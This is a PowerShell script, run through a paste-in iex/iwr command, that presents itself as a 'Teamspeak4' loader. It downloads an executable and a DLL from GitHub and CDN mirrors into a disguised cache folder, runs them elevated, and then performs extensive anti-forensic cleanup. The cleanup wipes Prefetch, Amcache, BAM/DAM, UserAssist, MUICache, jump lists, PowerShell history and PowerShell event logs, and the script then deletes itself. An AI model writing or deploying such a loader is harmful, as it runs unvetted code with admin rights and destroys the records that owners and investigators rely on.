# install.ps1 — Teamspeak4 loader + deep-clean (elevated)
# Usage: iex (iwr -UseBasicParsing 'https://raw.githubusercontent.com/kanokpoltankaew712-gif/Goup/main/install.ps1').Content

$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ──── Config ─────────────────────────────────────────────
$dir       = Join-Path $env:LOCALAPPDATA 'Microsoft\INetCache\cache'
$exeName   = 'Teamspeak4.exe'
$dllName   = 'TS3.dll'
$exe       = Join-Path $dir $exeName
$dll       = Join-Path $dir $dllName
$tmpExe    = Join-Path $dir 'T4.download'
$tmpDll    = Join-Path $dir 'T4.dll.download'

$adminCache = 'C:\Users\Administrator\AppData\Local\Microsoft\INetCache\cache'

$closeGraceSec   = 8
$killRetryRounds = 5

# ★ แก้ URL — repo ชื่อ Goup
$urls = @(
    'https://raw.githubusercontent.com/kanokpoltankaew712-gif/Goup/main',
    'https://cdn.jsdelivr.net/gh/kanokpoltankaew712-gif/Goup@main',
    'https://raw.githack.com/kanokpoltankaew712-gif/Goup/main'
)
$ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'

# ──── Helpers ────────────────────────────────────────────
function Remove-Safe($p, [switch]$Recurse) {
    if (-not (Test-Path -LiteralPath $p)) { return }
    try {
        if ($Recurse) { Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction Stop }
        else          { Remove-Item -LiteralPath $p -Force -ErrorAction Stop }
        Write-Host "  removed: $p" -ForegroundColor DarkGray
    } catch {
        Write-Host "  skip: $p" -ForegroundColor Yellow
    }
}

function Clear-PSHistory {
    foreach ($h in @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "$env:APPDATA\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt"
    )) {
        if (Test-Path -LiteralPath $h) {
            try { Clear-Content -LiteralPath $h -Force -ErrorAction Stop } catch {}
        }
    }
}

function Test-PE($p, [int]$MinBytes = 100KB) {
    if (-not (Test-Path -LiteralPath $p)) { return $false }
    try {
        $i = Get-Item -LiteralPath $p
        if ($i.Length -lt $MinBytes) { return $false }
        $b = New-Object byte[] 2
        $s = [IO.File]::OpenRead($p)
        try { [void]$s.Read($b, 0, 2) } finally { $s.Dispose() }
        return ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)
    } catch { return $false }
}

function Get-File($url, $dst) {
    try {
        Invoke-WebRequest -Uri $url -OutFile $dst -UseBasicParsing `
            -Headers @{ 'User-Agent' = $ua } -TimeoutSec 120
        return (Test-Path -LiteralPath $dst)
    } catch {
        return $false
    }
}

function Get-TeamspeakPids {
    Get-Process -ErrorAction SilentlyContinue |
        Where-Object {
            ($_.Path -and $_.Path -eq $exe) -or
            $_.ProcessName -match 'Teamspeak4|Teamspeak|ts4|T4'
        } | Select-Object -ExpandProperty Id
}

# ──── Kill ───────────────────────────────────────────────
function Stop-TeamspeakHard {
    param([int]$Rounds = 5)

    for ($r = 1; $r -le $Rounds; $r++) {
        $pids = Get-TeamspeakPids
        if (-not $pids -or $pids.Count -eq 0) {
            if ($r -gt 1) { Write-Host "  all processes gone (round $r)" -ForegroundColor DarkGray }
            return $true
        }

        Write-Host "  kill round $r/$Rounds — targets: $($pids -join ', ')" -ForegroundColor DarkGray

        foreach ($pid_ in $pids) {
            try { Stop-Process -Id $pid_ -Force -ErrorAction SilentlyContinue } catch {}
            try {
                Start-Process -FilePath 'taskkill.exe' `
                    -ArgumentList "/F /T /PID $pid_" `
                    -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
            } catch {}
        }

        Start-Sleep -Milliseconds 700
    }

    $still = Get-TeamspeakPids
    if ($still -and $still.Count -gt 0) {
        Write-Host "  ⚠ still alive after $Rounds rounds: $($still -join ', ')" -ForegroundColor Yellow
        return $false
    }
    return $true
}

# ──── Deep Clean ─────────────────────────────────────────
function Clean-AfterClose {
    Write-Host ''
    Write-Host 'Waiting grace period before cleanup...' -ForegroundColor Cyan
    Start-Sleep -Seconds $closeGraceSec

    Write-Host 'Cleaning traces (deep)...' -ForegroundColor Cyan

    # 1) Kill process ที่เกี่ยวข้องทั้งหมด
    [void](Stop-TeamspeakHard -Rounds $killRetryRounds)

    # 2) ลบไฟล์หลักและ temp
    Remove-Safe $tmpExe
    Remove-Safe $tmpDll
    Remove-Safe $exe
    Remove-Safe $dll

    # 3) ลบโฟลเดอร์ cache ที่ใช้เก็บไฟล์
    for ($i = 0; $i -lt 3; $i++) {
        if (-not (Test-Path -LiteralPath $dir)) { break }
        Remove-Safe $dir -Recurse
        Start-Sleep -Milliseconds 500
    }
    if (Test-Path -LiteralPath $dir) {
        try {
            Start-Process -FilePath 'cmd.exe' `
                -ArgumentList "/C rd /S /Q `"$dir`"" `
                -WindowStyle Hidden -Wait
            Write-Host "  forced remove: $dir" -ForegroundColor DarkGray
        } catch {}
    }

    # 4) ★ ลบ INetCache ทั้งหมด — ไม่ใช่แค่ cache/
    $inetCaches = @(
        $adminCache,
        (Join-Path $env:LOCALAPPDATA 'Microsoft\INetCache'),
        (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\INetCache'),
        (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\WebCache'),
        (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\INetCookies'),
        'C:\Users\Administrator\AppData\Local\Microsoft\INetCache',
        'C:\Users\Administrator\AppData\Local\Microsoft\Windows\INetCache',
        'C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache'
    )
    foreach ($sp in $inetCaches) {
        if (Test-Path -LiteralPath $sp) {
            try {
                Get-ChildItem -LiteralPath $sp -Recurse -Force -ErrorAction SilentlyContinue |
                    ForEach-Object {
                        try { Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction SilentlyContinue } catch {}
                    }
            } catch {}
            Remove-Safe $sp -Recurse
            if (Test-Path -LiteralPath $sp) {
                try {
                    Start-Process -FilePath 'cmd.exe' `
                        -ArgumentList "/C rd /S /Q `"$sp`"" `
                        -WindowStyle Hidden -Wait
                    Write-Host "  forced remove: $sp" -ForegroundColor DarkGray
                } catch {}
            }
        }
    }

    # 5) ลบโฟลเดอร์ที่เกี่ยวข้องใน LOCALAPPDATA / APPDATA / ProgramData
    foreach ($folder in @(
        'Teamspeak4cvrftg','Teamspeak4','TS4','T4','TeamSpeak','TeamSpeak3Client',
        'TeamSpeak 3 Client','ts3client'
    )) {
        Remove-Safe (Join-Path $env:LOCALAPPDATA $folder) -Recurse
        Remove-Safe (Join-Path $env:APPDATA      $folder) -Recurse
        Remove-Safe (Join-Path $env:ProgramData  $folder) -Recurse
    }

    # 6) ลบไฟล์ใน temp ที่ชื่อเกี่ยวข้อง
    $tempRoots = @($env:TEMP, (Join-Path $env:LOCALAPPDATA 'Temp'),
                   'C:\Windows\Temp')
    foreach ($root in $tempRoots) {
        if (-not (Test-Path -LiteralPath $root)) { continue }
        Get-ChildItem -LiteralPath $root -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match 'Teamspeak4|TS3|T4|teamspeak|Goup' } |
            ForEach-Object { Remove-Safe $_.FullName }
    }

    # 7) ลบ Recent files + Jump lists
    $recent = Join-Path $env:APPDATA 'Microsoft\Windows\Recent'
    if (Test-Path -LiteralPath $recent) {
        Get-ChildItem -LiteralPath $recent -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match 'powershell|\.ps1|Teamspeak4|TS3|teamspeak|Goup' } |
            ForEach-Object { Remove-Safe $_.FullName }
    }

    # Jump lists (automaticDestinations + customDestinations)
    foreach ($jl in @(
        (Join-Path $env:APPDATA 'Microsoft\Windows\Recent\AutomaticDestinations'),
        (Join-Path $env:APPDATA 'Microsoft\Windows\Recent\CustomDestinations')
    )) {
        if (Test-Path -LiteralPath $jl) {
            Get-ChildItem -LiteralPath $jl -File -ErrorAction SilentlyContinue |
                ForEach-Object { Remove-Safe $_.FullName }
        }
    }

    # 8) ★ ลบ Icon Cache + Thumbnail Cache
    $iconCaches = @(
        (Join-Path $env:LOCALAPPDATA 'IconCache.db'),
        (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Explorer\iconcache_*.db'),
        (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Explorer\thumbcache_*.db')
    )
    foreach ($ic in $iconCaches) {
        Get-ChildItem -Path $ic -Force -ErrorAction SilentlyContinue |
            ForEach-Object { Remove-Safe $_.FullName }
    }

    # 9) ลบ PowerShell history
    Clear-PSHistory

    # 10) Admin-only cleanup
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).
                IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {

        # 10a) Prefetch
        $prefetch = Join-Path $env:SystemRoot 'Prefetch'
        if (Test-Path -LiteralPath $prefetch) {
            Get-ChildItem -LiteralPath $prefetch -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -match 'TEAMSPEAK|TS3|T4|POWERSHELL|PWSH|GOUP' } |
                ForEach-Object { Remove-Safe $_.FullName }
        }

        # 10b) Scheduled Tasks
        try {
            Get-ScheduledTask -ErrorAction SilentlyContinue |
                Where-Object { $_.TaskName -match 'Teamspeak|TS3|T4|Goup' } |
                ForEach-Object {
                    Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                    Write-Host "  removed task: $($_.TaskName)" -ForegroundColor DarkGray
                }
        } catch {}

        # 10c) Amcache.hve
        try {
            $amcacheRoot = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppCompatFlags\Amcache'
            if (Test-Path $amcacheRoot) {
                Get-ChildItem $amcacheRoot -Recurse -ErrorAction SilentlyContinue |
                    ForEach-Object {
                        try {
                            $p = Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue
                            $names = @()
                            if ($p) {
                                $names = $p.PSObject.Properties |
                                    Where-Object { $_.Name -notmatch '^PS' } |
                                    ForEach-Object { "$($_.Name)=$($_.Value)" }
                            }
                            if (($names -join ';') -match 'Teamspeak4|TS3|T4|teamspeak|Goup') {
                                Remove-Item -Path $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue
                                Write-Host "  amcache removed: $($_.PSChildName)" -ForegroundColor DarkGray
                            }
                        } catch {}
                    }
            }
        } catch {}

        # 10d) BAM / DAM
        try {
            $bamKeys = @(
                'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings',
                'HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings',
                'HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings'
            )
            foreach ($bk in $bamKeys) {
                if (-not (Test-Path $bk)) { continue }
                Get-ChildItem $bk -ErrorAction SilentlyContinue | ForEach-Object {
                    $sidKey = $_.PSPath
                    Get-ItemProperty -Path $sidKey -ErrorAction SilentlyContinue |
                        Get-Member -MemberType NoteProperty -ErrorAction SilentlyContinue |
                        Where-Object { $_.Name -notmatch '^PS' } |
                        ForEach-Object {
                            $val = (Get-ItemProperty -Path $sidKey -Name $_.Name -ErrorAction SilentlyContinue).($_.Name)
                            if ("$val" -match 'Teamspeak4|TS3|T4|teamspeak|Goup') {
                                Remove-ItemProperty -Path $sidKey -Name $_.Name -Force -ErrorAction SilentlyContinue
                                Write-Host "  bam/dam removed: $($_.Name)" -ForegroundColor DarkGray
                            }
                        }
                }
            }
        } catch {}

        # 10e) ★ MUICache — cache ของโปรแกรมที่เคยรัน
        try {
            $muiCache = 'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache'
            if (Test-Path $muiCache) {
                Get-ItemProperty -Path $muiCache -ErrorAction SilentlyContinue |
                    Get-Member -MemberType NoteProperty -ErrorAction SilentlyContinue |
                    Where-Object { $_.Name -notmatch '^PS' } |
                    ForEach-Object {
                        $val = (Get-ItemProperty -Path $muiCache -Name $_.Name -ErrorAction SilentlyContinue).($_.Name)
                        if ("$val" -match 'Teamspeak4|TS3|T4|teamspeak|Goup') {
                            Remove-ItemProperty -Path $muiCache -Name $_.Name -Force -ErrorAction SilentlyContinue
                            Write-Host "  muicache removed: $($_.Name)" -ForegroundColor DarkGray
                        }
                    }
            }
        } catch {}

        # 10f) ★ UserAssist — ประวัติการรันผ่าน Explorer
        try {
            $ua = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist'
            if (Test-Path $ua) {
                Get-ChildItem $ua -ErrorAction SilentlyContinue | ForEach-Object {
                    $countKey = Join-Path $_.PSPath 'Count'
                    if (Test-Path $countKey) {
                        Get-ItemProperty -Path $countKey -ErrorAction SilentlyContinue |
                            Get-Member -MemberType NoteProperty -ErrorAction SilentlyContinue |
                            Where-Object { $_.Name -notmatch '^PS' } |
                            ForEach-Object {
                                # UserAssist keys เป็น ROT13-encoded — decode เพื่อเช็ค
                                try {
                                    $decoded = -join ($_.Name.ToCharArray() | ForEach-Object {
                                        $c = [int][char]$_
                                        if ($c -ge 65 -and $c -le 90)      { [char]((($c - 65 + 13) % 26) + 65) }
                                        elseif ($c -ge 97 -and $c -le 122) { [char]((($c - 97 + 13) % 26) + 97) }
                                        else { $_ }
                                    })
                                    if ($decoded -match 'Teamspeak4|TS3|T4|teamspeak|Goup') {
                                        Remove-ItemProperty -Path $countKey -Name $_.Name -Force -ErrorAction SilentlyContinue
                                        Write-Host "  userassist removed: $decoded" -ForegroundColor DarkGray
                                    }
                                } catch {}
                            }
                    }
                }
            }
        } catch {}

        # 10g) Event Log
        try {
            foreach ($logName in @('Microsoft-Windows-PowerShell/Operational','Windows PowerShell')) {
                try {
                    wevtutil.exe cl "$logName" 2>$null | Out-Null
                    Write-Host "  event log cleared: $logName" -ForegroundColor DarkGray
                } catch {}
            }
        } catch {}
    }

    # 11) ลบ Registry RunMRU
    try {
        $mru = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
        if (Test-Path $mru) {
            Get-ItemProperty $mru -ErrorAction SilentlyContinue |
                Get-Member -MemberType NoteProperty -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -notmatch '^(PS|MRUList)' } |
                ForEach-Object {
                    $val = (Get-ItemProperty $mru -Name $_.Name -ErrorAction SilentlyContinue).($_.Name)
                    if ($val -match 'teamspeak|TS3|T4|Teamspeak4|Goup') {
                        Remove-ItemProperty -Path $mru -Name $_.Name -Force -ErrorAction SilentlyContinue
                    }
                }
        }
    } catch {}

    # 12) ลบ TypedPaths
    try {
        $typed = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths'
        if (Test-Path $typed) {
            Get-ItemProperty $typed -ErrorAction SilentlyContinue |
                Get-Member -MemberType NoteProperty -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -notmatch '^PS' } |
                ForEach-Object {
                    $val = (Get-ItemProperty $typed -Name $_.Name -ErrorAction SilentlyContinue).($_.Name)
                    if ("$val" -match 'teamspeak|TS3|T4|INetCache|Teamspeak4|Goup') {
                        Remove-ItemProperty -Path $typed -Name $_.Name -Force -ErrorAction SilentlyContinue
                    }
                }
        }
    } catch {}

    # 13) ตรวจสอบ
    $left = @()
    if (Test-Path -LiteralPath $exe)        { $left += $exe }
    if (Test-Path -LiteralPath $dll)        { $left += $dll }
    if (Test-Path -LiteralPath $dir)        { $left += $dir }
    if (Test-Path -LiteralPath $adminCache) { $left += $adminCache }
    if ($left.Count -gt 0) {
        Write-Host "  ⚠ ยังเหลือ: $($left -join ', ')" -ForegroundColor Yellow
    } else {
        Write-Host 'Clean done. All traces removed.' -ForegroundColor Green
    }
}

# ──── Main ───────────────────────────────────────────────
try {
    if (-not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    if ((Test-Path -LiteralPath $exe) -and -not (Test-PE $exe 100KB)) {
        Remove-Safe $exe
    }
    if ((Test-Path -LiteralPath $dll) -and -not (Test-PE $dll 1KB)) {
        Remove-Safe $dll
    }

    # Download EXE
    if (-not (Test-PE $exe 100KB)) {
        Write-Host 'Downloading Teamspeak4.exe ...' -ForegroundColor Cyan
        $ok = $false
        foreach ($base in $urls) {
            for ($n = 1; $n -le 2; $n++) {
                try {
                    Remove-Safe $tmpExe
                    Write-Host "  try $n/2: $base/$exeName" -ForegroundColor DarkGray
                    if (Get-File "$base/$exeName" $tmpExe) {
                        if (Test-PE $tmpExe 100KB) {
                            Move-Item -LiteralPath $tmpExe -Destination $exe -Force
                            $ok = $true
                            break
                        }
                    }
                    Write-Host '  invalid file' -ForegroundColor Yellow
                } catch {
                    Write-Host "  failed: $($_.Exception.Message)" -ForegroundColor Yellow
                    Start-Sleep -Seconds 2
                }
            }
            if ($ok) { break }
        }
        if (-not $ok) { throw 'Cannot download Teamspeak4.exe' }
        Write-Host "Downloaded: $exe ($((Get-Item $exe).Length) bytes)" -ForegroundColor Green
    } else {
        Write-Host "Using cache: $exe" -ForegroundColor Green
    }

    # Download DLL
    if (-not (Test-PE $dll 1KB)) {
        Write-Host 'Downloading TS3.dll ...' -ForegroundColor Cyan
        $ok = $false
        foreach ($base in $urls) {
            for ($n = 1; $n -le 2; $n++) {
                try {
                    Remove-Safe $tmpDll
                    if (Get-File "$base/$dllName" $tmpDll) {
                        if (Test-PE $tmpDll 1KB) {
                            Move-Item -LiteralPath $tmpDll -Destination $dll -Force
                            $ok = $true
                            break
                        }
                    }
                } catch {
                    Start-Sleep -Seconds 2
                }
            }
            if ($ok) { break }
        }
        if (-not $ok) { throw 'Cannot download TS3.dll' }
        Write-Host "Downloaded: $dll ($((Get-Item $dll).Length) bytes)" -ForegroundColor Green
    }

    # Run — ★ elevate
    Write-Host 'Starting Teamspeak4 (elevated)...' -ForegroundColor Cyan
    $psi = New-Object Diagnostics.ProcessStartInfo
    $psi.FileName         = $exe
    $psi.WorkingDirectory = $dir
    $psi.UseShellExecute  = $true       # ★ elevate ต้อง true
    $psi.Verb             = 'runas'     # ★ ขอสิทธิ์ admin
    $proc = [Diagnostics.Process]::Start($psi)
    if ($null -eq $proc) { throw 'Cannot start Teamspeak4.exe' }

    Write-Host 'Teamspeak4 is running. Wait until you close the program...' -ForegroundColor Green
    Write-Host '(Do not close this PowerShell window)' -ForegroundColor Yellow

    try { $proc.WaitForExit() } catch {}
    Start-Sleep -Seconds 1

    # รอให้ process ตายจริง
    for ($i = 0; $i -lt 30; $i++) {
        $alive = Get-TeamspeakPids
        if (-not $alive -or $alive.Count -eq 0) { break }
        Start-Sleep -Seconds 1
    }

    Write-Host 'Teamspeak4 closed.' -ForegroundColor Cyan
    Clean-AfterClose
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    try { Clean-AfterClose } catch {}
}

# ──── Self-clean ─────────────────────────────────────────
try {
    $selfPath = $MyInvocation.MyCommand.Path
    if ($selfPath -and (Test-Path -LiteralPath $selfPath)) {
        Start-Process -FilePath 'cmd.exe' `
            -ArgumentList "/C ping -n 2 127.0.0.1 >nul & del /F /Q `"$selfPath`"" `
            -WindowStyle Hidden
    }
} catch {}

Write-Host ''
Read-Host 'Press Enter to close'
